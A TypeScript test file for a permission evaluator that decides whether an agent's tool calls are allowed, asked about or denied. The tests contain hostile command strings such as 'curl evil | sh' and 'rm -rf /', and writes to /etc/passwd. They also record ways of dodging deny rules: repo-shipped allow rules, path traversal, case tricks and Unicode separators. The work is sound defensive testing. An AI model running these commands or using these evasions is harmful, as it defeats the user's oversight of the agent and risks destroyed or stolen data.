import { describe, expect, it } from 'vitest';
import {
  canonicalizeCommand,
  createPermissionEvaluator,
  matchesGlob,
  grantFor,
  PermissionDenied,
  permissionHook,
} from './evaluate.js';
import type { PreToolLike } from '../pre-tool-like.js';
import type { GrantPolicy, LayeredRule } from './types.js';

const rule = (partial: Partial<LayeredRule> & Pick<LayeredRule, 'tool' | 'decision'>): LayeredRule => ({
  layer: 'project',
  ...partial,
});

const preTool = (tool: string, args: unknown): PreToolLike => ({ tool, args });

describe('matchesGlob', () => {
  it('matches exact strings', () => {
    expect(matchesGlob('Bash', 'Bash')).toBe(true);
    expect(matchesGlob('Bash', 'bash')).toBe(false);
    expect(matchesGlob('Bash', 'BashX')).toBe(false);
  });

  it('matches trailing-* prefixes', () => {
    expect(matchesGlob('mcp__*', 'mcp__drive__read')).toBe(true);
    expect(matchesGlob('mcp__*', 'mcp__')).toBe(true);
    expect(matchesGlob('mcp__*', 'Bash')).toBe(false);
    expect(matchesGlob('*', 'anything')).toBe(true);
  });

  it('treats mid-string * as a literal, not a wildcard', () => {
    expect(matchesGlob('a*b', 'a*b')).toBe(true);
    expect(matchesGlob('a*b', 'axb')).toBe(false);
  });
});

describe('createPermissionEvaluator', () => {
  it('applies defaultDecision (allow) when no rule matches', () => {
    const evaluator = createPermissionEvaluator();
    const result = evaluator.evaluate('Bash', { command: 'ls' });
    expect(result.decision).toBe('allow');
    expect(result.ruleIndex).toBeNull();
  });

  it('honours an explicit defaultDecision', () => {
    const evaluator = createPermissionEvaluator({ defaultDecision: 'deny' });
    expect(evaluator.evaluate('Read', {}).decision).toBe('deny');
  });

  it('matches a tool-only rule', () => {
    const evaluator = createPermissionEvaluator({
      rules: [rule({ tool: 'Bash', decision: 'deny' })],
    });
    const result = evaluator.evaluate('Bash', { command: 'ls' });
    expect(result.decision).toBe('deny');
    expect(result.ruleIndex).toBe(0);
    expect(result.reason).toContain('Bash');
  });

  it('matches Bash args.command against a match prefix-glob', () => {
    const evaluator = createPermissionEvaluator({
      rules: [rule({ tool: 'Bash', match: 'rm *', decision: 'deny' })],
    });
    expect(evaluator.evaluate('Bash', { command: 'rm -rf /' }).decision).toBe('deny');
    expect(evaluator.evaluate('Bash', { command: 'ls' }).decision).toBe('allow');
  });

  it('matches file tools against args.file_path', () => {
    const evaluator = createPermissionEvaluator({
      rules: [rule({ tool: 'Write', match: '/etc/*', decision: 'deny' })],
    });
    expect(evaluator.evaluate('Write', { file_path: '/etc/passwd' }).decision).toBe('deny');
    expect(evaluator.evaluate('Write', { file_path: '/tmp/x' }).decision).toBe('allow');
  });

  it('a match rule does not fire when args lack the canonical field shape', () => {
    const evaluator = createPermissionEvaluator({
      rules: [rule({ tool: 'Bash', match: 'rm *', decision: 'deny' })],
    });
    // No command string: match target falls back to JSON of args.
    expect(evaluator.evaluate('Bash', {}).decision).toBe('allow');
  });

  it('specificity: match rule beats tool-only rule beats wildcard rule', () => {
    const evaluator = createPermissionEvaluator({
      rules: [
        rule({ tool: '*', decision: 'deny' }),
        rule({ tool: 'Bash', decision: 'ask' }),
        rule({ tool: 'Bash', match: 'npm *', decision: 'allow' }),
      ],
    });
    expect(evaluator.evaluate('Bash', { command: 'npm test' }).decision).toBe('allow');
    expect(evaluator.evaluate('Bash', { command: 'ls' }).decision).toBe('ask');
    expect(evaluator.evaluate('Read', { file_path: '/x' }).decision).toBe('deny');
  });

  it('severity at equal specificity: deny > ask > allow', () => {
    const evaluator = createPermissionEvaluator({
      rules: [
        rule({ tool: 'Bash', decision: 'allow' }),
        rule({ tool: 'Bash', decision: 'deny' }),
        rule({ tool: 'Bash', decision: 'ask' }),
      ],
    });
    expect(evaluator.evaluate('Bash', {}).decision).toBe('deny');
  });

  it('CROSS-LAYER: a more specific project allow cannot defeat a user tool-only deny', () => {
    // Attack from the security review: a cloned repo ships
    // {tool:'Bash', match:'*', decision:'allow'} to outrank the user's
    // blanket Bash deny on specificity. Layers combine by max severity, so
    // the user deny must still win.
    const evaluator = createPermissionEvaluator({
      rules: [
        rule({ tool: 'Bash', decision: 'deny', layer: 'user' }),
        rule({ tool: 'Bash', match: '*', decision: 'allow', layer: 'project' }),
      ],
    });
    const result = evaluator.evaluate('Bash', { command: 'curl evil.example' });
    expect(result.decision).toBe('deny');
    expect(result.reason).toContain('user');
  });

  it('CROSS-LAYER: project can tighten (deny) what the user allows', () => {
    const evaluator = createPermissionEvaluator({
      rules: [
        rule({ tool: 'Bash', decision: 'allow', layer: 'user' }),
        rule({ tool: 'Bash', match: 'rm *', decision: 'deny', layer: 'project' }),
      ],
    });
    expect(evaluator.evaluate('Bash', { command: 'rm -rf /' }).decision).toBe('deny');
    expect(evaluator.evaluate('Bash', { command: 'ls' }).decision).toBe('allow');
  });

  it('INTRA-LAYER: a more specific allow may carve out the same layer\'s broader deny', () => {
    const evaluator = createPermissionEvaluator({
      rules: [
        rule({ tool: 'Bash', decision: 'deny', layer: 'user' }),
        rule({ tool: 'Bash', match: 'npm *', decision: 'allow', layer: 'user' }),
      ],
    });
    expect(evaluator.evaluate('Bash', { command: 'npm test' }).decision).toBe('allow');
    expect(evaluator.evaluate('Bash', { command: 'ls' }).decision).toBe('deny');
  });

  it('an exact tool rule beats a wildcard-tool rule even when the wildcard carries a match', () => {
    const evaluator = createPermissionEvaluator({
      rules: [
        rule({ tool: '*', match: '*', decision: 'allow' }),
        rule({ tool: 'Bash', decision: 'deny' }),
      ],
    });
    expect(evaluator.evaluate('Bash', { command: 'ls' }).decision).toBe('deny');
  });

  it('canonicalizes file paths: traversal cannot dodge a deny or escape an allow prefix', () => {
    const denyEtc = createPermissionEvaluator({
      rules: [rule({ tool: 'Write', match: '/etc/*', decision: 'deny' })],
    });
    expect(denyEtc.evaluate('Write', { file_path: '/tmp/../etc/passwd' }).decision).toBe('deny');

    const sandboxed = createPermissionEvaluator({
      defaultDecision: 'deny',
      rules: [rule({ tool: 'Write', match: '/safe/project/*', decision: 'allow' })],
    });
    expect(
      sandboxed.evaluate('Write', { file_path: '/safe/project/../../etc/passwd' }).decision,
    ).toBe('deny');
    expect(sandboxed.evaluate('Write', { file_path: '/safe/project/file.txt' }).decision).toBe(
      'allow',
    );
  });

  it('relative-path match patterns still fire against resolved targets', () => {
    // Regression from the verify pass: canonicalising only the target made
    // relative deny patterns silently fail open.
    const evaluator = createPermissionEvaluator({
      rules: [rule({ tool: 'Write', match: 'secrets/*', decision: 'deny' })],
    });
    expect(evaluator.evaluate('Write', { file_path: 'secrets/prod.key' }).decision).toBe('deny');
    expect(
      evaluator.evaluate('Write', { file_path: `${process.cwd()}/secrets/prod.key` }).decision,
    ).toBe('deny');
    expect(evaluator.evaluate('Write', { file_path: 'public/readme.md' }).decision).toBe('allow');
  });

  it('pattern canonicalisation preserves the trailing separator: /etc/* cannot match /etcetera', () => {
    const evaluator = createPermissionEvaluator({
      rules: [rule({ tool: 'Write', match: '/etc/*', decision: 'deny' })],
    });
    expect(evaluator.evaluate('Write', { file_path: '/etcetera/file' }).decision).toBe('allow');
    expect(evaluator.evaluate('Write', { file_path: '/etc/hosts' }).decision).toBe('deny');
  });

  it('a bare * match pattern still matches any path', () => {
    const evaluator = createPermissionEvaluator({
      rules: [rule({ tool: 'Write', match: '*', decision: 'deny' })],
    });
    expect(evaluator.evaluate('Write', { file_path: '/anywhere/x' }).decision).toBe('deny');
  });

  it.runIf(process.platform === 'darwin' || process.platform === 'win32')(
    'a path deny rule cannot be dodged by case variation on case-insensitive platforms',
    () => {
      // Review finding: /ETC/passwd is the same file as /etc/passwd on APFS,
      // but lexical compare let it dodge the deny rule → defaultDecision allow.
      const evaluator = createPermissionEvaluator({
        rules: [rule({ tool: 'Write', match: '/etc/*', decision: 'deny' })],
      });
      expect(evaluator.evaluate('Write', { file_path: '/ETC/passwd' }).decision).toBe('deny');
      expect(evaluator.evaluate('Write', { file_path: '/tmp/../ETC/passwd' }).decision).toBe(
        'deny',
      );
    },
  );

  it('a path deny rule cannot be dodged by Unicode form (NFC/NFD), on any platform', () => {
    // V11 gate-level regression: rule written NFC, tool call arrives NFD for the
    // same file. NFC folding in canonicalizePath applies regardless of platform.
    const denyDir = '/data/Caf\u00e9'; // e-acute NFC in the rule
    const nfdCall = '/data/Cafe\u0301/secret.txt'; // e-acute NFD in the tool call
    const evaluator = createPermissionEvaluator({
      rules: [rule({ tool: 'Write', match: `${denyDir}/*`, decision: 'deny' })],
    });
    expect(evaluator.evaluate('Write', { file_path: nfdCall }).decision).toBe('deny');
  });

  it('match rules gate the full path-taking tool surface via the shared table', () => {
    const evaluator = createPermissionEvaluator({
      rules: [
        rule({ tool: '*', match: '/etc/*', decision: 'deny' }),
      ],
    });
    expect(evaluator.evaluate('Glob', { pattern: '*', path: '/etc/cron.d' }).decision).toBe(
      'deny',
    );
    expect(
      evaluator.evaluate('NotebookEdit', { notebook_path: '/etc/x.ipynb' }).decision,
    ).toBe('deny');
    expect(evaluator.evaluate('Grep', { pattern: 'x', path: '/home/ok' }).decision).toBe('allow');
  });

  it('match rules reach the five tools the table lacked at the pinned SDK (issue #86)', () => {
    // Before #86 the match target for each was JSON.stringify(args), which
    // starts with `{"` and so no path or command glob could ever fire.
    const evaluator = createPermissionEvaluator({
      rules: [
        rule({ tool: '*', match: '/etc/*', decision: 'deny' }),
        rule({ tool: '*', match: 'rm *', decision: 'deny' }),
      ],
    });
    expect(evaluator.evaluate('Artifact', { file_path: '/etc/passwd', favicon: 'x' }).decision).toBe(
      'deny',
    );
    expect(evaluator.evaluate('Workflow', { scriptPath: '/etc/../etc/passwd' }).decision).toBe('deny');
    expect(evaluator.evaluate('EnterWorktree', { path: '/etc' }).decision).toBe('deny');
    expect(
      evaluator.evaluate('Projects', { method: 'project_write', local_path: '/etc/shadow' }).decision,
    ).toBe('deny');
    expect(
      evaluator.evaluate('Monitor', {
        description: 'd',
        timeout_ms: 1,
        persistent: false,
        command: 'rm -rf /',
      }).decision,
    ).toBe('deny');
    expect(evaluator.evaluate('Workflow', { scriptPath: '/home/ok/wf.js' }).decision).toBe('allow');
  });

  it('a dir/* path deny rule also matches the bare directory (inclusive boundary)', () => {
    // Verify-pass finding: {tool:'Glob', match:'/secrets/*'} missed
    // Glob(path='/secrets'), which still enumerates the whole directory.
    const evaluator = createPermissionEvaluator({
      rules: [rule({ tool: 'Glob', match: '/secrets/*', decision: 'deny' })],
    });
    expect(evaluator.evaluate('Glob', { pattern: '*', path: '/secrets' }).decision).toBe('deny');
    expect(evaluator.evaluate('Glob', { pattern: '*', path: '/secrets/sub' }).decision).toBe(
      'deny',
    );
    // Boundary safety preserved: the sibling dir is not the protected one.
    expect(evaluator.evaluate('Glob', { pattern: '*', path: '/secrets-public' }).decision).toBe(
      'allow',
    );
  });

  it('prefixes default-decision reasons with permission: for grep-ability', () => {
    const evaluator = createPermissionEvaluator({ defaultDecision: 'deny' });
    expect(evaluator.evaluate('Bash', {}).reason).toMatch(/^permission: default deny/);
  });

  it('user-layer deny survives project-layer allow (sticky deny)', () => {
    const evaluator = createPermissionEvaluator({
      rules: [
        rule({ tool: 'Bash', decision: 'deny', layer: 'user' }),
        rule({ tool: 'Bash', decision: 'allow', layer: 'project' }),
      ],
    });
    const result = evaluator.evaluate('Bash', {});
    expect(result.decision).toBe('deny');
    expect(result.reason).toContain('user');
  });

  it('the reason never carries the rule’s match glob (issue #59, R-17 channels c/d)', () => {
    // Match globs are routinely absolute paths under the operator's home
    // directory, and the reason string reaches two retained sinks. The
    // [rule N, layer] identifier is the recovery key; the glob itself must
    // never leave the settings file via a retained reason.
    const evaluator = createPermissionEvaluator({
      rules: [
        rule({ tool: 'Write', match: '/Users/op/clients/acme-corp/*', decision: 'deny' }),
      ],
    });
    const result = evaluator.evaluate('Write', {
      file_path: '/Users/op/clients/acme-corp/plan.md',
    });
    expect(result.decision).toBe('deny');
    expect(result.reason).toBe('permission: deny Write [rule 0, project]');
    expect(result.reason).not.toContain('acme-corp');
  });

  it('the reason’s rule index is the position within the winning rule’s OWN layer', () => {
    // With the glob gone, [rule N, layer] is the only recovery key, so N must
    // index into the file the layer tag names. A combined-list index shifts
    // by however many user rules exist — an operator counting rules in their
    // project settings.json would resolve the wrong rule (panel-executed
    // counterexample, 2026-08-07).
    const evaluator = createPermissionEvaluator({
      rules: [
        rule({ tool: 'Read', decision: 'allow', layer: 'user' }),
        rule({ tool: 'Glob', decision: 'allow', layer: 'user' }),
        rule({ tool: 'Write', decision: 'deny', layer: 'project' }),
      ],
    });
    const result = evaluator.evaluate('Write', { file_path: '/tmp/x' });
    expect(result.decision).toBe('deny');
    expect(result.reason).toContain('[rule 0, project]');
    // (layer, ruleIndex) is the complete structured identity — a per-layer
    // index alone is ambiguous between the two files (review finding).
    expect(result.ruleIndex).toBe(0);
    expect(result.layer).toBe('project');
  });

  it('default decisions carry null for both halves of the rule identity', () => {
    const evaluator = createPermissionEvaluator({ defaultDecision: 'deny' });
    const result = evaluator.evaluate('Bash', {});
    expect(result.ruleIndex).toBeNull();
    expect(result.layer).toBeNull();
  });
});

describe('grantFor (#140, D-7, D-8): the one decision that a rule allow is a grant', () => {
  const evaluate = (rules: LayeredRule[], tool = 'Bash') => createPermissionEvaluator({ rules }).evaluate(tool, { command: 'git status' });
  const open: GrantPolicy = { ungrantableTools: new Set() };
  const noBash: GrantPolicy = { ungrantableTools: new Set(['Bash']) };
  const reasonOf = (e: ReturnType<typeof evaluate>) => ({ grant: 'rule', reason: e.reason });

  it('a user-layer allow grants', () => {
    const e = evaluate([rule({ tool: 'Bash', decision: 'allow', layer: 'user' })]);
    expect(grantFor('Bash', e, open)).toEqual(reasonOf(e));
  });
  it.each([
    ['project allow', [rule({ tool: 'Bash', decision: 'allow', layer: 'project' })]],
    ['default allow', []],
    ['user ask', [rule({ tool: 'Bash', decision: 'ask', layer: 'user' })]],
    ['user deny', [rule({ tool: 'Bash', decision: 'deny', layer: 'user' })]],
  ] as const)('%s does not grant', (_name, rules) => {
    expect(grantFor('Bash', evaluate([...rules]), open)).toBeUndefined();
  });
  it('Bash in ungrantableTools never grants; Bash grantable does', () => {
    const e = evaluate([rule({ tool: 'Bash', decision: 'allow', layer: 'user' })]);
    expect(grantFor('Bash', e, noBash)).toBeUndefined();
    expect(grantFor('Bash', e, open)).toEqual(reasonOf(e));
  });
  it('a non-Bash tool is unaffected by the Bash policy', () => {
    const e = evaluate([rule({ tool: 'Read', decision: 'allow', layer: 'user' })], 'Read');
    expect(grantFor('Read', e, noBash)).toEqual(reasonOf(e));
  });
});

describe('permissionHook', () => {
  const grantAll: GrantPolicy = { ungrantableTools: new Set() };
  const bashWithheld: GrantPolicy = { ungrantableTools: new Set(['Bash']) };
  const denyBash = createPermissionEvaluator({
    rules: [rule({ tool: 'Bash', decision: 'deny' })],
  });
  const askBash = createPermissionEvaluator({
    rules: [rule({ tool: 'Bash', decision: 'ask' })],
  });

  it('does not throw for allowed tools', async () => {
    const hook = permissionHook(denyBash, undefined, grantAll);
    await expect(hook(preTool('Read', { file_path: '/x' }))).resolves.toBeUndefined();
  });

  it('throws PermissionDenied with a rule-bearing reason on deny', async () => {
    const hook = permissionHook(denyBash, undefined, grantAll);
    await expect(hook(preTool('Bash', { command: 'ls' }))).rejects.toThrowError(PermissionDenied);
    await expect(hook(preTool('Bash', { command: 'ls' }))).rejects.toThrow(/permission/);
  });

  it("fails closed on 'ask' with no prompter", async () => {
    const hook = permissionHook(askBash, undefined, grantAll);
    await expect(hook(preTool('Bash', { command: 'ls' }))).rejects.toThrow(/no prompter/);
  });

  it("resolves 'ask' via the prompter: true allows, false denies", async () => {
    const allowAll = permissionHook(askBash, async () => true, grantAll);
    await expect(allowAll(preTool('Bash', {}))).resolves.toBeUndefined();

    const denyAll = permissionHook(askBash, async () => false, grantAll);
    await expect(denyAll(preTool('Bash', {}))).rejects.toThrowError(PermissionDenied);
  });

  // Spec pin iv (#140, D-7): kept by behaviour name; the mutation manifest binds it as "a USER-layer rule allow".
  it('a USER-layer rule allow returns the grant whose reason equals evaluate().reason; a project-layer allow and a default allow return undefined', async () => {
    const userAllow = createPermissionEvaluator({ rules: [rule({ tool: 'Bash', match: 'git *', decision: 'allow', layer: 'user' })] });
    const projectAllow = createPermissionEvaluator({ rules: [rule({ tool: 'Bash', decision: 'allow', layer: 'project' })] });
    const nothing = createPermissionEvaluator({ rules: [] });
    const call = preTool('Bash', { command: 'git status' });
    await expect(permissionHook(userAllow, undefined, grantAll)(call)).resolves.toEqual({ grant: 'rule', reason: userAllow.evaluate('Bash', { command: 'git status' }).reason });
    expect(userAllow.evaluate('Bash', { command: 'git status' }).reason).toBe('permission: allow Bash [rule 0, user]');
    await expect(permissionHook(projectAllow, undefined, grantAll)(call)).resolves.toBeUndefined();
    await expect(permissionHook(nothing, undefined, grantAll)(call)).resolves.toBeUndefined();
  });

  it('a user deny beside a project allow still throws (sticky deny)', async () => {
    const mixed = createPermissionEvaluator({ rules: [rule({ tool: 'Bash', decision: 'deny', layer: 'user' }), rule({ tool: 'Bash', decision: 'allow', layer: 'project' })] });
    await expect(permissionHook(mixed, undefined, grantAll)(preTool('Bash', {}))).rejects.toThrowError(PermissionDenied);
  });

  it('a project DENY beside a user allow throws: the grant never reaches a deny winner', async () => {
    const mixed = createPermissionEvaluator({ rules: [rule({ tool: 'Bash', decision: 'allow', layer: 'user' }), rule({ tool: 'Bash', decision: 'deny', layer: 'project' })] });
    await expect(permissionHook(mixed, undefined, grantAll)(preTool('Bash', {}))).rejects.toThrowError(PermissionDenied);
  });

  it('a project ASK beside a user allow, approved, resolves undefined (ask outranks allow; no grant)', async () => {
    const mixed = createPermissionEvaluator({ rules: [rule({ tool: 'Bash', decision: 'allow', layer: 'user' }), rule({ tool: 'Bash', decision: 'ask', layer: 'project' })] });
    await expect(permissionHook(mixed, async () => true, grantAll)(preTool('Bash', {}))).resolves.toBeUndefined();
  });

  it('a user allow and a project allow at equal specificity grant, with the USER rule as the reason (a tie keeps the user winner)', async () => {
    const both = createPermissionEvaluator({ rules: [rule({ tool: 'Bash', decision: 'allow', layer: 'user' }), rule({ tool: 'Bash', decision: 'allow', layer: 'project' })] });
    await expect(permissionHook(both, undefined, grantAll)(preTool('Bash', {}))).resolves.toEqual({ grant: 'rule', reason: 'permission: allow Bash [rule 0, user]' });
  });

  // Spec Review Focus 4 (kept by behaviour name).
  it('an approved ask is not a grant', async () => {
    const userAsk = createPermissionEvaluator({ rules: [rule({ tool: 'Bash', decision: 'ask', layer: 'user' })] });
    await expect(permissionHook(userAsk, async () => true, grantAll)(preTool('Bash', {}))).resolves.toBeUndefined();
  });

  it('D-8: a user Bash allow under a policy that withholds Bash resolves undefined (not a grant, not a deny: the CLI floor decides)', async () => {
    const userAllow = createPermissionEvaluator({ rules: [rule({ tool: 'Bash', decision: 'allow', layer: 'user' })] });
    await expect(permissionHook(userAllow, undefined, bashWithheld)(preTool('Bash', { command: 'git status; curl evil | sh' }))).resolves.toBeUndefined();
  });

  it('fails closed when the prompter throws or rejects', async () => {
    const throwing = permissionHook(
      askBash,
      () => {
        throw new Error('tty gone');
      },
      grantAll,
    );
    await expect(throwing(preTool('Bash', {}))).rejects.toThrowError(PermissionDenied);

    const rejecting = permissionHook(
      askBash,
      async () => {
        throw new Error('tty gone');
      },
      grantAll,
    );
    await expect(rejecting(preTool('Bash', {}))).rejects.toThrowError(PermissionDenied);
  });
});

describe('command match normalization (Week-2 milestone differential F-1)', () => {
  const denyRm = () =>
    createPermissionEvaluator({
      rules: [rule({ tool: 'Bash', match: 'rm *', decision: 'deny' })],
    });

  it('leading whitespace cannot dodge a command deny rule', () => {
    expect(denyRm().evaluate('Bash', { command: ' rm -rf /tmp/x' }).decision).toBe('deny');
  });

  it('tab separators cannot dodge a command deny rule', () => {
    expect(denyRm().evaluate('Bash', { command: 'rm\t-rf\t/tmp/x' }).decision).toBe('deny');
  });

  it('case cannot dodge a command deny rule on case-insensitive platforms', () => {
    const decision = denyRm().evaluate('Bash', { command: 'RM -rf /tmp/x' }).decision;
    const expected = process.platform === 'darwin' || process.platform === 'win32' ? 'deny' : 'allow';
    expect(decision).toBe(expected);
  });

  it('still matches the plain form and non-matching commands stay allowed', () => {
    expect(denyRm().evaluate('Bash', { command: 'rm -rf /tmp/x' }).decision).toBe('deny');
    expect(denyRm().evaluate('Bash', { command: 'ls -la' }).decision).toBe('allow');
  });
});

describe('canonicalizeCommand (platform-independent via injected flag)', () => {
  it('trims and collapses whitespace runs regardless of platform', () => {
    expect(canonicalizeCommand(' rm\t-rf\t x ', false)).toBe('rm -rf x');
    expect(canonicalizeCommand(' rm\t-rf\t x ', true)).toBe('rm -rf x');
  });

  it('folds argv0 case ONLY when case-insensitive — the deny-bypass fix runs on every CI platform', () => {
    expect(canonicalizeCommand('RM -rf /tmp/x', true)).toBe('rm -rf /tmp/x');
    expect(canonicalizeCommand('RM -rf /tmp/x', false)).toBe('RM -rf /tmp/x');
    expect(canonicalizeCommand('GIT', true)).toBe('git');
  });

  it('never folds arguments — an allow rule is not widened to case-variants of URLs/flags', () => {
    expect(canonicalizeCommand('curl https://API.Example.com/Health', true)).toBe(
      'curl https://API.Example.com/Health',
    );
  });

  it('handles degenerate inputs: empty, whitespace-only, bare *', () => {
    expect(canonicalizeCommand('', true)).toBe('');
    expect(canonicalizeCommand('   \t ', true)).toBe('');
    expect(canonicalizeCommand('*', true)).toBe('*');
  });

  it('collapses runs of spaces and tabs only; a newline stays (issue #161)', () => {
    expect(canonicalizeCommand('git \t  status', false)).toBe('git status');
    expect(canonicalizeCommand('\n git status \n', false)).toBe('git status');
    // A newline ends a command; it does not separate the words of one.
    expect(canonicalizeCommand('git\nstatus', false)).toBe('git\nstatus');
    // A CR is not a shell blank: it stays in the word, as bash keeps it.
    expect(canonicalizeCommand('git status\r', false)).toBe('git status\r');
  });
});

// Bash splits words on space, tab and newline only (issue #161, ADR-0014 §1).
// JS \s also eats NBSP, U+2028/9, VT, FF, U+3000 and BOM (NEL is not \s, but bash keeps it in a word too), so the
// canonicaliser used to turn `git<sep>status` into `git status` and an allow
// or ask rule for `git status` matched a command bash runs as the program
// named `git<sep>status`. Escapes, not literal characters, so an editor
// cannot normalise a row into a plain space.
const NON_BLANK_SPACES = [
  ['NBSP', '\u00a0'],
  ['NEL', '\u0085'],
  ['LINE SEPARATOR', '\u2028'],
  ['PARAGRAPH SEPARATOR', '\u2029'],
  ['VT', '\v'],
  ['FF', '\f'],
  ['IDEOGRAPHIC SPACE', '\u3000'],
  ['BOM', '\ufeff'],
] as const;

describe('command rules read argv[0] the way the shell does (issue #161)', () => {
  const evalBash = (
    rules: LayeredRule[],
    command: string,
    defaultDecision?: 'allow' | 'ask' | 'deny',
  ) =>
    createPermissionEvaluator({ rules, defaultDecision }).evaluate('Bash', { command }).decision;

  it('the table holds what its names say (guards the escapes)', () => {
    expect(NON_BLANK_SPACES.map(([, ch]) => ch.codePointAt(0))).toEqual([
      0xa0, 0x85, 0x2028, 0x2029, 0x0b, 0x0c, 0x3000, 0xfeff,
    ]);
  });

  it.each(NON_BLANK_SPACES)('%s stays inside the word through canonicalizeCommand', (_n, ch) => {
    expect(canonicalizeCommand(`git${ch}status`, false)).toBe(`git${ch}status`);
    expect(canonicalizeCommand(`git${ch}status`, true)).toBe(`git${ch}status`);
    expect(canonicalizeCommand(`${ch}git status`, false)).toBe(`${ch}git status`);
    expect(canonicalizeCommand(`git status${ch}`, false)).toBe(`git status${ch}`);
  });

  it.each(NON_BLANK_SPACES)('allow `git status` and `git *` do not match git%sstatus', (_n, ch) => {
    const command = `git${ch}status`;
    for (const match of ['git status', 'git *']) {
      const rules = [rule({ tool: 'Bash', match, decision: 'allow' })];
      // No rule matches, so the default applies: prove it is the default that
      // answered, not the allow rule, by flipping the default.
      expect(evalBash(rules, command, 'deny'), match).toBe('deny');
      expect(evalBash(rules, 'git status', 'deny'), match).toBe('allow');
    }
  });

  it.each(NON_BLANK_SPACES)('ask `git *` does not match git%sstatus', (_n, ch) => {
    const rules = [rule({ tool: 'Bash', match: 'git *', decision: 'ask' })];
    expect(evalBash(rules, `git${ch}status`)).toBe('allow');
    expect(evalBash(rules, 'git status')).toBe('ask');
  });

  it.each(NON_BLANK_SPACES)('deny `git *` no longer over-matches git%sstatus', (_n, ch) => {
    const rules = [rule({ tool: 'Bash', match: 'git *', decision: 'deny' })];
    expect(evalBash(rules, 'git status')).toBe('deny');
    // The rule names the program git; bash runs a program called
    // `git<sep>status`. The default decision answers, here and with a deny default.
    expect(evalBash(rules, `git${ch}status`)).toBe('allow');
    expect(evalBash(rules, `git${ch}status`, 'deny')).toBe('deny');
    const verdict = createPermissionEvaluator({ rules }).evaluate('Bash', {
      command: `git${ch}status`,
    });
    expect(verdict.ruleIndex).toBeNull();
    expect(verdict.reason).toContain('default allow (no matching rule)');
  });

  it.each(NON_BLANK_SPACES)('a rule naming the %s-joined program matches it', (_n, ch) => {
    const rules = [rule({ tool: 'Bash', match: `git${ch}status`, decision: 'deny' })];
    expect(evalBash(rules, `git${ch}status`)).toBe('deny');
    expect(evalBash(rules, 'git status')).toBe('allow');
  });

  it('tabs and runs of spaces still collapse, so the rule matches them', () => {
    const rules = [rule({ tool: 'Bash', match: 'git status', decision: 'deny' })];
    expect(evalBash(rules, 'git\t status')).toBe('deny');
    expect(evalBash(rules, '  git   status  ')).toBe('deny');
    expect(evalBash(rules, '\tgit\t\tstatus\n')).toBe('deny');
  });

  it('a newline between words is a command boundary, not a space', () => {
    const rules = [rule({ tool: 'Bash', match: 'git status', decision: 'deny' })];
    expect(evalBash(rules, 'git\nstatus')).toBe('allow');
  });

  it('the case fold stops at the first shell separator, not at a Unicode space', () => {
    expect(canonicalizeCommand('GIT\tSTATUS', true)).toBe('git STATUS');
    expect(canonicalizeCommand('GIT\nSTATUS', true)).toBe('git\nSTATUS');
    // NBSP is part of the word, so the whole word (NBSP and what follows) folds.
    expect(canonicalizeCommand('GIT\u00a0STATUS arg', true)).toBe('git\u00a0status arg');
    expect(canonicalizeCommand('GIT\u00a0STATUS ARG', true)).toBe('git\u00a0status ARG');
  });
});

describe('allow rules are not widened by command normalization', () => {
  it('argv0-only fold keeps an allow rule scoped to the exact argument case', () => {
    const evaluator = createPermissionEvaluator({
      defaultDecision: 'deny',
      rules: [
        rule({ tool: 'Bash', match: 'curl https://api.example.com/health*', decision: 'allow' }),
      ],
    });
    expect(
      evaluator.evaluate('Bash', { command: 'curl https://api.example.com/health' }).decision,
    ).toBe('allow');
    expect(
      evaluator.evaluate('Bash', { command: 'curl https://API.EXAMPLE.COM/OTHER' }).decision,
    ).toBe('deny');
  });
});
